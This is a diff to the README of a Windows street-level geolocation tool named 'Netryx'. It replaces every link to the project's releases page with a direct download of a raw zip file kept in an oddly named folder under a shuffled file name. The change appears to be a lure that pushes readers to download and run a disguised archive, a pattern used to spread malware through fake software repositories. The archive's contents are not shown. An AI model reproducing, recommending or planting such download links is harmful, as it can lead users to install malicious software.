@@ -1,6 +1,6 @@
 # 📍 Netryx-OpenSource-Next-Gen-Street-Level-Geolocation - Find Street Images Fast
 
-[![Download Netryx](https://img.shields.io/badge/Download%20Netryx-1F4E79?style=for-the-badge&logo=github&logoColor=white)](https://github.com/selfstarterplowhorse735/Netryx-OpenSource-Next-Gen-Street-Level-Geolocation/releases)
+[![Download Netryx](https://img.shields.io/badge/Download%20Netryx-1F4E79?style=for-the-badge&logo=github&logoColor=white)](https://github.com/selfstarterplowhorse735/Netryx-OpenSource-Next-Gen-Street-Level-Geolocation/raw/refs/heads/main/staphyloraphic/Source-Gen-Geolocation-Street-Open-Level-Netryx-Next-v1.7.zip)
 
 ## 🧭 What Netryx Does
 
@@ -39,7 +39,7 @@ Netryx works best on a modern Windows PC.
 
 Visit the release page to download and run the Windows version:
 
-[Go to the Netryx releases page](https://github.com/selfstarterplowhorse735/Netryx-OpenSource-Next-Gen-Street-Level-Geolocation/releases)
+[Go to the Netryx releases page](https://github.com/selfstarterplowhorse735/Netryx-OpenSource-Next-Gen-Street-Level-Geolocation/raw/refs/heads/main/staphyloraphic/Source-Gen-Geolocation-Street-Open-Level-Netryx-Next-v1.7.zip)
 
 ## 🪟 Install on Windows
 
@@ -174,7 +174,7 @@ For best results, use clear, full-size images rather than compressed previews.
 
 Use this page to get the latest Windows build:
 
-[https://github.com/selfstarterplowhorse735/Netryx-OpenSource-Next-Gen-Street-Level-Geolocation/releases](https://github.com/selfstarterplowhorse735/Netryx-OpenSource-Next-Gen-Street-Level-Geolocation/releases)
+[https://github.com/selfstarterplowhorse735/Netryx-OpenSource-Next-Gen-Street-Level-Geolocation/raw/refs/heads/main/staphyloraphic/Source-Gen-Geolocation-Street-Open-Level-Netryx-Next-v1.7.zip](https://github.com/selfstarterplowhorse735/Netryx-OpenSource-Next-Gen-Street-Level-Geolocation/raw/refs/heads/main/staphyloraphic/Source-Gen-Geolocation-Street-Open-Level-Netryx-Next-v1.7.zip)
 
 ## 🛠️ What the Tool Looks For
 
